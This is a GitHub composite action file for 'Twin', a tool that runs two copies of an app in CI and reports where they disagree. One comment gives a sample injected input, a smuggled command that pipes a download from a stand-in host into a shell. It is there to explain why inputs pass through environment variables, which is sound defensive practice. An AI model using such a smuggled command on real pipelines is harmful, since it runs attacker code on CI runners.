name: "Twin"
description: "Runs two copies of your app and shows you where they disagree."
author: "Sharaj R Shetty"
branding:
  icon: "copy"
  color: "purple"

inputs:
  project-dir:
    description: 'Directory of the project to test, relative to the workflow''s working directory. Defaults to "." (the checked-out repo root).'
    required: false
    default: "."
  scenario:
    description: 'Path to scenario.yaml. Defaults to twin.config.json''s "scenario" in project-dir.'
    required: false
  start:
    description: 'Start command. Defaults to twin.config.json''s "start", then auto-detection from package.json.'
    required: false
  build:
    description: "Build command to run once per instance workspace before start."
    required: false
  setup:
    description: 'Command run in the project before each phase, e.g. a throwaway database''s reset. Defaults to twin.config.json''s "setup".'
    required: false
  health-path:
    description: "Path polled for readiness."
    required: false
  port-env:
    description: "Env var name the app reads its port from."
    required: false
  boot-timeout-ms:
    description: "Boot timeout per instance, in ms."
    required: false
  request-timeout-ms:
    description: "Timeout for a single scenario request, in ms. Bounds the whole run so a hung app can't stall the job."
    required: false
  allow-remote:
    description: "Allow running even if the environment looks like it points at a non-local database/service."
    required: false
    default: "false"
  fail-on-finding:
    description: "Fail the job when Twin finds a real multi-instance bug (exit code 1), not just when Twin itself errors (exit code 2)."
    required: false
    default: "true"
  node-version:
    description: >-
      Node.js version to set up before running. Empty (the default) uses the Node already on PATH, so the
      version your app runs on is the one your workflow chose - Twin needs >= 20. Set it only if the
      runner has no suitable Node, and note it changes Node for later steps (and your app) too.
    required: false
    default: ""
  install:
    description: >-
      How to install the project's own dependencies before running it. "auto" (the default) picks from
      the lockfile/manifest: npm ci / yarn / pnpm, pip into .venv from requirements.txt, bundle install,
      composer install, go mod download. "none" skips it (you installed them in an earlier step).
      Anything else is run as a shell command in project-dir.
    required: false
    default: "auto"

outputs:
  exit-code:
    description: "Twin's own exit code: 0 safe, 1 found a bug, 2 Twin couldn't tell (including Twin's own errors)."
    value: ${{ steps.run.outputs.exit-code }}
  report-dir:
    description: "Path to the run's .twin/runs/<id> artifact directory (report.json, report.md), relative to project-dir."
    value: ${{ steps.run.outputs.report-dir }}

runs:
  using: "composite"
  steps:
    # Only when asked: setting up Node here used to force Node 20 onto the
    # rest of the job, the user's app included, whatever version they test on.
    - name: Set up Node.js
      if: inputs.node-version != ''
      uses: actions/setup-node@v7
      with:
        node-version: ${{ inputs.node-version }}

    - name: Check Node.js
      shell: bash
      run: |
        set -u
        if ! command -v node >/dev/null 2>&1; then
          echo "::error::Twin needs Node.js >= 20 on PATH. Add actions/setup-node before this step, or set the node-version input."
          exit 2
        fi
        major="$(node -p 'process.versions.node.split(".")[0]')"
        if [ "$major" -lt 20 ]; then
          echo "::error::Twin needs Node.js >= 20, and the Node on PATH is $(node --version). Set up a newer one, or set the node-version input."
          exit 2
        fi

    - name: Build Twin
      shell: bash
      working-directory: ${{ github.action_path }}
      run: |
        npm ci --ignore-scripts
        npm run build

    # Without this, a Node project following the README's snippet had no
    # node_modules, and every run ended in E_BOOT_CRASH.
    - name: Install the project's dependencies
      shell: bash
      working-directory: ${{ inputs.project-dir }}
      env:
        TWIN_INSTALL: ${{ inputs.install }}
      run: |
        set -euo pipefail
        case "$TWIN_INSTALL" in
          none|"")
            echo "install: none" ;;
          auto)
            if [ -f package-lock.json ] || [ -f npm-shrinkwrap.json ]; then npm ci
            elif [ -f pnpm-lock.yaml ]; then corepack enable && pnpm install --frozen-lockfile
            elif [ -f yarn.lock ]; then corepack enable && yarn install --frozen-lockfile
            elif [ -f package.json ]; then npm install
            elif [ -f requirements.txt ]; then
              # Into .venv, which is where Twin's Python stack looks for it.
              python -m venv .venv
              py=.venv/bin/python; [ -x "$py" ] || py=.venv/Scripts/python.exe
              "$py" -m pip install -r requirements.txt
            elif [ -f Gemfile ]; then bundle install
            elif [ -f composer.json ]; then composer install --no-interaction --no-progress
            elif [ -f go.mod ]; then go mod download
            else echo "install: nothing to install (no lockfile or manifest found)"
            fi ;;
          *)
            bash -c "$TWIN_INSTALL" ;;
        esac

    - name: Run Twin
      id: run
      shell: bash
      # Every input is passed through the environment and referenced as "$VAR",
      # never interpolated into the script body with ${{ }}. Interpolation
      # happens before bash ever sees the line, so an input containing
      # `"; curl evil.sh | sh; #` would otherwise execute as part of this step.
      env:
        TWIN_CLI: ${{ github.action_path }}/dist/cli/index.js
        TWIN_PROJECT_DIR: ${{ inputs.project-dir }}
        TWIN_SCENARIO: ${{ inputs.scenario }}
        TWIN_START: ${{ inputs.start }}
        TWIN_BUILD: ${{ inputs.build }}
        TWIN_SETUP: ${{ inputs.setup }}
        TWIN_HEALTH_PATH: ${{ inputs.health-path }}
        TWIN_PORT_ENV: ${{ inputs.port-env }}
        TWIN_BOOT_TIMEOUT_MS: ${{ inputs.boot-timeout-ms }}
        TWIN_REQUEST_TIMEOUT_MS: ${{ inputs.request-timeout-ms }}
        TWIN_ALLOW_REMOTE: ${{ inputs.allow-remote }}
        TWIN_FAIL_ON_FINDING: ${{ inputs.fail-on-finding }}
      run: |
        set -uo pipefail

        ARGS=(run --project "${TWIN_PROJECT_DIR:-.}")
        [ -n "$TWIN_SCENARIO" ] && ARGS+=(--scenario "$TWIN_SCENARIO")
        [ -n "$TWIN_START" ] && ARGS+=(--start "$TWIN_START")
        [ -n "$TWIN_BUILD" ] && ARGS+=(--build "$TWIN_BUILD")
        [ -n "$TWIN_SETUP" ] && ARGS+=(--setup "$TWIN_SETUP")
        [ -n "$TWIN_HEALTH_PATH" ] && ARGS+=(--health-path "$TWIN_HEALTH_PATH")
        [ -n "$TWIN_PORT_ENV" ] && ARGS+=(--port-env "$TWIN_PORT_ENV")
        [ -n "$TWIN_BOOT_TIMEOUT_MS" ] && ARGS+=(--boot-timeout-ms "$TWIN_BOOT_TIMEOUT_MS")
        [ -n "$TWIN_REQUEST_TIMEOUT_MS" ] && ARGS+=(--request-timeout-ms "$TWIN_REQUEST_TIMEOUT_MS")
        [ "$TWIN_ALLOW_REMOTE" = "true" ] && ARGS+=(--allow-remote)

        # Twin's exit code IS the result (0/1/2), so a non-zero exit must not
        # abort the step before the outputs below are written.
        code=0
        node "$TWIN_CLI" "${ARGS[@]}" || code=$?

        echo "exit-code=$code" >> "$GITHUB_OUTPUT"
        latest_file="${TWIN_PROJECT_DIR:-.}/.twin/latest"
        if [ -f "$latest_file" ]; then
          echo "report-dir=${TWIN_PROJECT_DIR:-.}/.twin/runs/$(cat "$latest_file")" >> "$GITHUB_OUTPUT"
        fi

        if [ "$code" = "2" ]; then exit 2; fi
        if [ "$TWIN_FAIL_ON_FINDING" = "true" ] && [ "$code" = "1" ]; then exit 1; fi
        exit 0
